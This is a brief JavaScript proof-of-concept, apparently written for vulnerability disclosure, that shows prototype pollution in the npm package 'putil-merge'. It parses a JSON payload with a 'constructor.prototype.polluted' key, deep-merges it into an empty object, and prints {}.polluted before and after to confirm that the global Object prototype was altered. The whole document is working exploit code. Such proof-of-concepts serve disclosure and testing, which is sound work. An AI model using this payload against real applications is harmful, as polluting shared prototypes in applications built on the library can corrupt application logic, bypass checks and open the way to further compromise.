var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const putil_merge = require('putil-merge');
const payload = JSON.parse('{"constructor": {"prototype": {"polluted":"yes"}}}');
var obj = {};
console.log({}.polluted);
putil_merge(obj, payload, { deep: true });
console.log({}.polluted);